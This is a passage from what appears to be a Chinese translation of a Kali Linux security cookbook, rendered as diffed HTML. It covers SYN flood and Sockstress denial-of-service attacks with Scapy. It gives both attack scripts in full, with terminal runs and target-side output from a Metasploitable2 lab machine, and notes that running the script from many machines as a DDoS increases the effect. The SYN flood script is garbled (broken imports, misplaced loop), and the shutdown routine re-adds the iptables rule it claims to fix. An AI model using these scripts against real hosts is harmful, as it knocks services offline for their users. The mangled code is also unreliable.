+</code></pre><p>&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x72EC;&#x7ACB;&#x5730;&#x6784;&#x5EFA;&#x548C;&#x5806;&#x53E0;&#x6BCF;&#x4E2A;&#x5C42;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x8BF7;&#x6C42;&#x3002; &#x76F8;&#x53CD;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x5E76;&#x5411;&#x5176;&#x4F20;&#x9012;&#x9002;&#x5F53;&#x7684;&#x53C2;&#x6570;&#x6765;&#x4F7F;&#x7528;&#x5355;&#x884C;&#x547D;&#x4EE4;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; sr1(IP(dst=&quot;172.16.36.135&quot;)/TCP()) 
+Begin emission: 
+......................................................
+Finished to send 1 packets. 
+..* 
+Received 57 packets, got 1 answers, remaining 0 packets 
+&lt;IP  version=4L ihl=5L tos=0x0 len=44 id=0 flags=DF frag=0L ttl=64 proto=tcp chksum=0x9944 src=172.16.36.135 dst=172.16.36.224 options=[] |&lt;TCP  sport=http dport=ftp_data seq=2078775635 ack=1 dataofs=6L reserved=0L flags=SA window=5840 chksum=0xca1e urgptr=0 options=[(&apos;MSS&apos;, 1460)] |&lt;Padding  load=&apos;\x00\x00&apos; |&gt;&gt;&gt;
+</code></pre><p>SYN &#x6CDB;&#x6D2A;&#x7684;&#x6548;&#x7387;&#x53D6;&#x51B3;&#x4E8E;&#x5728;&#x7ED9;&#x5B9A;&#x65F6;&#x95F4;&#x6BB5;&#x5185;&#x53EF;&#x4EE5;&#x751F;&#x6210;&#x7684; SYN &#x8BF7;&#x6C42;&#x7684;&#x6570;&#x91CF;&#x3002; &#x4E3A;&#x4E86;&#x63D0;&#x9AD8;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x5E8F;&#x5217;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x6211;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x591A;&#x7EBF;&#x7A0B;&#x811A;&#x672C;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x53EF;&#x7531;&#x653B;&#x51FB;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x7684;&#xFF0C;&#x5C3D;&#x53EF;&#x80FD;&#x591A;&#x7684; SYN &#x6570;&#x636E;&#x5305;&#x6CE8;&#x5165;&#x7684;&#x5E76;&#x53D1;&#x8FDB;&#x7A0B;&#xFF1A;</p>
+<pre><code>#!/usr/bin/python
+
+from scapy.all 
+import * from time 
+import sleep 
+import thread 
+import random 
+import logging 
+logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
+
+if len(sys.argv) != 4:   
+    print &quot;Usage - ./syn_flood.py [Target-IP] [Port Number] [Threads]&quot;   
+    print &quot;Example - ./sock_stress.py 10.0.0.5 80 20&quot;   
+    print &quot;Example will perform a 20x multi-threaded SYN flood attack&quot;   
+    print &quot;against the HTTP (port 80) service on 10.0.0.5&quot;   
+    sys.exit()
+
+target = str(sys.argv[1]) 
+port = int(sys.argv[2]) 
+threads = int(sys.argv[3])
+
+print &quot;Performing SYN flood. Use Ctrl+C to stop attack.&quot; 
+def synflood(target,port):   
+    while 0 == 0:
+        x = random.randint(0,65535)      
+        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
+
+    for x in range(0,threads):   
+        thread.start_new_thread(synflood, (target,port))
+
+    while 0 == 0:   
+        sleep(1)
+</code></pre><p>&#x811A;&#x672C;&#x5728;&#x6267;&#x884C;&#x65F6;&#x63A5;&#x53D7;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x3002; &#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x5305;&#x62EC;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#xFF0C;SYN  &#x6CDB;&#x6D2A;&#x6240;&#x53D1;&#x9001;&#x5230;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x4EE5;&#x53CA;&#x5C06;&#x7528;&#x4E8E;&#x6267;&#x884C; SYN &#x6CDB;&#x6D2A;&#x7684;&#x7EBF;&#x7A0B;&#x6216;&#x5E76;&#x53D1;&#x8FDB;&#x7A0B;&#x7684;&#x6570;&#x91CF;&#x3002; &#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x4EE5;&#x751F;&#x6210; 0 &#x5230; 65,535 &#x4E4B;&#x95F4;&#x7684;&#x6574;&#x6570;&#x503C;&#x5F00;&#x59CB;&#x3002; &#x6B64;&#x8303;&#x56F4;&#x8868;&#x793A;&#x53EF;&#x5206;&#x914D;&#x7ED9;&#x6E90;&#x7AEF;&#x53E3;&#x7684;&#x5168;&#x90E8;&#x53EF;&#x80FD;&#x503C;&#x3002; &#x5B9A;&#x4E49;&#x6E90;&#x548C;&#x76EE;&#x6807;&#x7AEF;&#x53E3;&#x5730;&#x5740;&#x7684; TCP &#x62A5;&#x5934;&#x7684;&#x90E8;&#x5206;&#x5728;&#x957F;&#x5EA6;&#x4E0A;&#x90FD;&#x662F; 16 &#x6BD4;&#x7279;&#x3002; &#x6BCF;&#x4E2A;&#x4F4D;&#x53EF;&#x4EE5;&#x4E3A; 1 &#x6216; 0&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6709;<code>2 ** 16</code>&#x6216; 65,536 &#x4E2A;&#x53EF;&#x80FD;&#x7684; TCP &#x7AEF; &#x53E3;&#x5730;&#x5740;&#x3002; &#x5355;&#x4E2A;&#x6E90;&#x7AEF;&#x53E3;&#x53EA;&#x80FD;&#x7EF4;&#x6301;&#x4E00;&#x4E2A;&#x534A;&#x5F00;&#x8FDE;&#x63A5;&#xFF0C;&#x56E0;&#x6B64;&#x901A;&#x8FC7;&#x4E3A;&#x6BCF;&#x4E2A; SYN &#x8BF7;&#x6C42;&#x751F;&#x6210;&#x552F;&#x4E00;&#x7684;&#x6E90;&#x7AEF;&#x53E3;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5927;&#x5927;&#x63D0;&#x9AD8;&#x653B;&#x51FB;&#x7684;&#x6027;&#x80FD;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./syn_flood.py U
+sage - ./syn_flood.py [Target-IP] [Port Number] [Threads] 
+Example - ./sock_stress.py 10.0.0.5 80 20 
+Example will perform a 20x multi-threaded SYN flood attack against the HTTP (port 80) service on 10.0.0.5 
+root@KaliLinux:~# ./syn_flood.py 172.16.36.135 80 20 
+Performing SYN flood. Use Ctrl+C to stop attack.
+</code></pre><p>&#x5F53;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7ED9;&#x7528;&#x6237;&#x3002;&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x811A;&#x672C;&#x5BF9;&#x6258;&#x7BA1;&#x5728;<code>172.16.36.135</code>&#x7684; TCP &#x7AEF;&#x53E3; 80 &#x4E0A;&#x7684; HTTP Web &#x670D;&#x52A1;&#x6267;&#x884C;&#xFF0C;&#x5177;&#x6709; 20 &#x4E2A;&#x5E76;&#x53D1;&#x7EBF;&#x7A0B; &#x3002;&#x811A;&#x672C;&#x672C;&#x8EAB;&#x63D0;&#x4F9B;&#x7684;&#x53CD;&#x9988;&#x5F88;&#x5C11;; &#x4F46;&#x662F;&#xFF0C;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x6D41;&#x91CF;&#x6355;&#x83B7;&#x5DE5;&#x5177;&#xFF08;&#x5982; Wireshark &#x6216; TCPdump&#xFF09;&#x6765;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x6B63;&#x5728;&#x53D1;&#x9001;&#x8FDE;&#x63A5;&#x3002;&#x5728;&#x975E;&#x5E38;&#x77ED;&#x6682;&#x7684;&#x65F6;&#x95F4;&#x4E4B;&#x540E;&#xFF0C;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x63A5;&#x5C1D;&#x8BD5;&#x4F1A;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x6162;&#x6216;&#x5B8C;&#x5168;&#x65E0;&#x54CD;&#x5E94;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>TCP &#x670D;&#x52A1;&#x53EA;&#x5141;&#x8BB8;&#x5EFA;&#x7ACB;&#x6709;&#x9650;&#x6570;&#x91CF;&#x7684;&#x534A;&#x5F00;&#x8FDE;&#x63A5;&#x3002; &#x901A;&#x8FC7;&#x5FEB;&#x901F;&#x53D1;&#x9001;&#x5927;&#x91CF;&#x7684; TCP SYN &#x8BF7;&#x6C42;&#xFF0C;&#x8FD9;&#x4E9B;&#x53EF;&#x7528;&#x7684;&#x8FDE;&#x63A5;&#x4F1A;&#x88AB;&#x8017;&#x5C3D;&#xFF0C;&#x5E76;&#x4E14;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x4E0D;&#x518D;&#x80FD;&#x591F;&#x63A5;&#x53D7;&#x65B0;&#x7684;&#x4F20;&#x5165;&#x8FDE;&#x63A5;&#x3002; &#x56E0;&#x6B64;&#xFF0C;&#x65B0;&#x7528;&#x6237;&#x5C06;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x8BE5;&#x670D;&#x52A1;&#x3002; &#x901A;&#x8FC7;&#x5C06;&#x5176;&#x7528;&#x4F5C; DDoS &#x5E76;&#x4E14;&#x4F7F;&#x591A;&#x4E2A;&#x653B;&#x51FB;&#x7CFB;&#x7EDF;&#x540C;&#x65F6;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x8BE5;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x53EF;&#x4EE5;&#x8FDB;&#x4E00;&#x6B65;&#x52A0;&#x5F3A;&#x3002;</p>
+<h2 id="68-sockstress-dos-&#x653B;&#x51FB;">6.8 Sockstress DoS &#x653B;&#x51FB;</h2>
+<p>Sockstress DoS &#x653B;&#x51FB;&#x6D89;&#x53CA;&#x5230;&#x4E0E;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x76F8;&#x5173;&#x7684; TCP &#x7AEF;&#x53E3;&#x5EFA;&#x7ACB;&#x4E00;&#x7CFB;&#x5217;&#x5F00;&#x653E;&#x8FDE;&#x63A5;&#x3002; TCP &#x63E1;&#x624B;&#x4E2D;&#x7684;&#x6700;&#x7EC8; ACK &#x54CD;&#x5E94;&#x7684;&#x503C;&#x5E94;&#x4E3A; 0&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7528; Scapy &#x5BF9;&#x76EE;&#x6807;&#x6267;&#x884C;Sockstress DoS &#x653B;&#x51FB;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x8FD0;&#x884C; TCP &#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x8FDC;&#x7A0B;&#x7CFB;&#x7EDF;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4F7F;&#x7528; Metasploitable2 &#x7684;&#x5B9E;&#x4F8B;&#x7528;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Metasploitable2 &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Metasploitable2&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x4F7F;&#x7528; Scapy &#x7F16;&#x5199;&#xFF0C;&#x7528;&#x4E8E;&#x5BF9;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x6267;&#x884C; Sockstress DoS &#x653B;&#x51FB;&#x3002; &#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x53EF;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#xFF1A;</p>
+<pre><code class="lang-py"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> * 
+<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep 
+<span class="hljs-keyword">import</span> thread 
+<span class="hljs-keyword">import</span> logging 
+<span class="hljs-keyword">import</span> os 
+<span class="hljs-keyword">import</span> signal 
+<span class="hljs-keyword">import</span> sys 
+logging.getLogger(<span class="hljs-string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)
+
+<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">4</span>:   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads]&quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Example - ./sock_stress.py 10.0.0.5 21 20&quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Example will perform a 20x multi-threaded sock-stress DoS attack &quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;against the FTP (port 21) service on 10.0.0.5&quot;</span>  
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\n***NOTE***&quot;</span>
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Make sure you target a port that responds when a connection is made&quot;</span>   
+    sys.exit()
+
+target = str(sys.argv[<span class="hljs-number">1</span>]) 
+dstport = int(sys.argv[<span class="hljs-number">2</span>]) 
+threads = int(sys.argv[<span class="hljs-number">3</span>])
+
+<span class="hljs-comment">## This is where the magic happens </span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sockstress</span><span class="hljs-params">(target,dstport)</span>:</span>   <span class="hljs-keyword">while</span> <span class="hljs-number">0</span> == <span class="hljs-number">0</span>:      
+    <span class="hljs-keyword">try</span>:         
+        x = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">65535</span>)         
+        response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags =<span class="hljs-string">&apos;S&apos;</span>),timeout=<span class="hljs-number">1</span>,verbose=<span class="hljs-number">0</span>)                        
+        send(IP(dst=target)/ TCP(dport=dstport,sport=x,window=<span class="hljs-number">0</span>,flags=<span class="hljs-string">&apos;A&apos;</span>,ack=(response[TCP].seq + <span class="hljs-number">1</span>))/<span class="hljs-string">&apos;\x00\x00&apos;</span>,verbose=<span class="hljs-number">0</span>)     
+    <span class="hljs-keyword">except</span>:         
+        <span class="hljs-keyword">pass</span>
+
+<span class="hljs-comment">## Graceful shutdown allows IP Table Repair </span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">graceful_shutdown</span><span class="hljs-params">(signal, frame)</span>:</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;\nYou pressed Ctrl+C!&apos;</span>  
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;Fixing IP Tables&apos;</span>   
+    os.system(<span class="hljs-string">&apos;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d &apos;</span> + target + <span class="hljs-string">&apos; -j DROP&apos;</span>)   
+    sys.exit()
+
+<span class="hljs-comment">## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections </span>
+os.system(<span class="hljs-string">&apos;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d &apos;</span> + target + <span class="hljs-string">&apos; -j DROP&apos;</span>) 
+signal.signal(signal.SIGINT, graceful_shutdown)
+
+<span class="hljs-comment">## Spin up multiple threads to launch the attack</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\nThe onslaught has begun...use Ctrl+C to stop the attack&quot;</span> 
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,threads):   
+    thread.start_new_thread(sockstress, (target,dstport))
+
+<span class="hljs-comment">## Make it go FOREVER (...or at least until Ctrl+C) </span>
+<span class="hljs-keyword">while</span> <span class="hljs-number">0</span> == <span class="hljs-number">0</span>:   
+    sleep(<span class="hljs-number">1</span>)
+</code></pre>
+<p>&#x8BF7;&#x6CE8;&#x610F;&#xFF0C;&#x6B64;&#x811A;&#x672C;&#x6709;&#x4E24;&#x4E2A;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#xFF0C;&#x5305;&#x62EC; sockstress &#x653B;&#x51FB;&#x529F;&#x80FD;&#x548C;&#x5355;&#x72EC;&#x7684;&#x6B63;&#x5E38;&#x5173;&#x673A;&#x529F;&#x80FD;&#x3002; &#x5173;&#x95ED;&#x9700;&#x8981;&#x5355;&#x72EC;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x4E3A;&#x4E86;&#x4F7F;&#x811A;&#x672C;&#x6B63;&#x5E38;&#x8FD0;&#x884C;&#xFF0C;&#x811A;&#x672C;&#x5FC5;&#x987B;&#x4FEE;&#x6539;&#x672C;&#x5730; iptables &#x89C4;&#x5219;&#x3002; &#x6B64;&#x66F4;&#x6539;&#x662F;&#x5FC5;&#x9700;&#x7684;&#xFF0C;&#x4EE5;&#x4FBF;&#x4F7F;&#x7528; Scapy &#x5B8C;&#x6210;&#x4E0E;&#x8FDC;&#x7A0B;&#x4E3B;&#x673A;&#x7684; TCP &#x8FDE;&#x63A5;&#x3002; &#x5728;&#x7B2C;&#x4E09;&#x7AE0;&#x201C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x201D;&#x7684;&#x201C;&#x4F7F;&#x7528; Scapy &#x914D;&#x7F6E;&#x8FDE;&#x63A5;&#x626B;&#x63CF;&#x201D;&#x4E2D;&#xFF0C;&#x66F4;&#x5F7B;&#x5E95;&#x5730;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E00;&#x95EE;&#x9898;&#x3002; &#x5728;&#x6267;&#x884C;&#x811A;&#x672C;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; netstat &#x548C; free &#x5DE5;&#x5177;&#x4E3A;&#x5DF2;&#x5EFA;&#x7ACB;&#x7684;&#x8FDE;&#x63A5;&#x548C;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x5185;&#x5B58;&#x83B7;&#x53D6;&#x57FA;&#x7EBF;&#xFF1A;</p>
+<pre><code>msfadmin@metasploitable:~$ netstat | grep ESTABLISHED 
+tcp6       0      0 172.16.36.131%13464:ssh 172.16.36.1%8191:49826  ESTABLISHED 
+udp        0      0 localhost:32840         localhost:32840         ESTABLISHED 
+msfadmin@metasploitable:~$ free -m 
+
+             total       used       free     shared    buffers     cached 
+Mem:           503        157        345          0         13         54 
+-/+ buffers/cache:         89        413 
+Swap:            0          0          0
+</code></pre><p>&#x901A;&#x8FC7;&#x4F7F;&#x7528; netstat&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x7BA1;&#x9053;&#x8F93;&#x51FA;&#x5230;<code>grep</code>&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x53EA;&#x63D0;&#x53D6;&#x5DF2;&#x5EFA;&#x7ACB;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x53EA;&#x5B58;&#x5728;&#x4E24;&#x4E2A;&#x8FDE;&#x63A5;&#x3002; &#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>free</code>&#x5DE5;&#x5177;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7684;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x3002; <code>-m</code>&#x9009;&#x9879;&#x7528;&#x4E8E;&#x8FD4;&#x56DE;&#x4EE5;&#x5146;&#x5B57;&#x8282;&#x4E3A;&#x5355;&#x4F4D;&#x7684;&#x503C;&#x3002; &#x5728;&#x786E;&#x5B9A;&#x5DF2;&#x5EFA;&#x7ACB;&#x7684;&#x8FDE;&#x63A5;&#x548C;&#x53EF;&#x7528;&#x5185;&#x5B58;&#x7684;&#x57FA;&#x7EBF;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5BF9;&#x6B64;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x542F;&#x52A8;&#x653B;&#x51FB;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./sock_stress.py 
+Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads] 
+Example - ./sock_stress.py 10.0.0.5 21 20 
+Example will perform a 20x multi-threaded sock-stress DoS attack against the FTP (port 21) service on 10.0.0.
+
+***NOTE*** 
+Make sure you target a port that responds when a connection is made 
+root@KaliLinux:~# ./sock_stress.py 172.16.36.131 21 20
+
+The onslaught has begun...use Ctrl+C to stop the attack
+</code></pre><p>&#x901A;&#x8FC7;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x63D0;&#x4F9B;&#x7684;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8FD4;&#x56DE;&#x9884;&#x671F;&#x7684;&#x8BED;&#x6CD5;&#x548C;&#x7528;&#x6CD5;&#x3002;&#x811A;&#x672C;&#x5728;&#x6267;&#x884C;&#x65F6;&#x63A5;&#x53D7;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x3002;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x5305;&#x62EC;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#xFF0C;sock stress DoS&#x6240;&#x53D1;&#x9001;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x4EE5;&#x53CA;&#x5C06;&#x7528;&#x4E8E;&#x6267;&#x884C; sock stress DoS &#x7684;&#x7EBF;&#x7A0B;&#x6216;&#x5E76;&#x53D1;&#x8FDB;&#x7A0B;&#x7684;&#x6570;&#x91CF;&#x3002;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x4EE5;&#x751F;&#x6210; 0 &#x5230; 65,535 &#x4E4B;&#x95F4;&#x7684;&#x6574;&#x6570;&#x503C;&#x5F00;&#x59CB;&#x3002;&#x6B64;&#x8303;&#x56F4;&#x8868;&#x793A;&#x53EF;&#x5206;&#x914D;&#x7ED9;&#x6E90;&#x7AEF;&#x53E3;&#x7684;&#x5168;&#x90E8;&#x53EF;&#x80FD;&#x503C;&#x3002;&#x5B9A;&#x4E49;&#x6E90;&#x548C;&#x76EE;&#x7684;&#x5730;&#x7AEF;&#x53E3;&#x5730;&#x5740;&#x7684; TCP &#x62A5;&#x5934;&#x7684;&#x90E8;&#x5206;&#x5728;&#x957F;&#x5EA6;&#x4E0A;&#x90FD;&#x662F; 16 &#x6BD4;&#x7279;&#x3002;&#x6BCF;&#x4E2A;&#x4F4D;&#x53EF;&#x4EE5;&#x4E3A;&#x503C; 1 &#x6216; 0&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6709;<code>2 ** 16</code>&#x6216; 65,536 &#x4E2A;&#x53EF;&#x80FD;&#x7684; TCP &#x7AEF;&#x53E3;&#x5730;&#x5740;&#x3002;&#x5355;&#x4E2A;&#x6E90;&#x7AEF;&#x53E3;&#x53EA;&#x80FD;&#x7EF4;&#x6301;&#x5355;&#x4E2A;&#x8FDE;&#x63A5;&#xFF0C;&#x56E0;&#x6B64;&#x901A;&#x8FC7;&#x4E3A;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x751F;&#x6210;&#x552F;&#x4E00;&#x7684;&#x6E90;&#x7AEF;&#x53E3;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5927;&#x5927;&#x63D0;&#x9AD8;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x3002;&#x4E00;&#x65E6;&#x653B;&#x51FB;&#x5F00;&#x59CB;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x68C0;&#x67E5;&#x5728;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5EFA;&#x7ACB;&#x7684;&#x6D3B;&#x52A8;&#x8FDE;&#x63A5;&#xFF0C;&#x6765;&#x9A8C;&#x8BC1;&#x5B83;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#xFF1A;</p>
+<pre><code>msfadmin@metasploitable:~$ netstat | grep ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:25624     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:12129     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:31294     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:46731     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:15281     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:47576     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:27472     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:11152     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:56245     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:1161      ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:21064     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:29344     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:43747     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:59609     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:31927     ESTABLISHED
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:12257     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:54709     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:55595     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:12992     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:24171     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:37207     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:39224     ESTABLISHED
+</code></pre><p>&#x5728;&#x6267;&#x884C;&#x811A;&#x672C;&#x540E;&#x7684;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5DF2;&#x5EFA;&#x7ACB;&#x7684;&#x8FDE;&#x63A5;&#x7684;&#x6570;&#x91CF;&#x6025;&#x5267;&#x589E;&#x52A0;&#x3002; &#x6B64;&#x5904;&#x663E;&#x793A;&#x7684;&#x8F93;&#x51FA;&#x5DF2;&#x622A;&#x65AD;&#xFF0C;&#x8FDE;&#x63A5;&#x5217;&#x8868;&#x5B9E;&#x9645;&#x4E0A;&#x660E;&#x663E;&#x957F;&#x4E8E;&#x6B64;&#xFF1A;</p>
+<pre><code>msfadmin@metasploitable:~$ free -m             
+             total       used       free     shared    buffers     cached 
+Mem:           503        497          6          0        149        
+138 -/+ buffers/cache:        209        294 
+Swap:            0          0          0
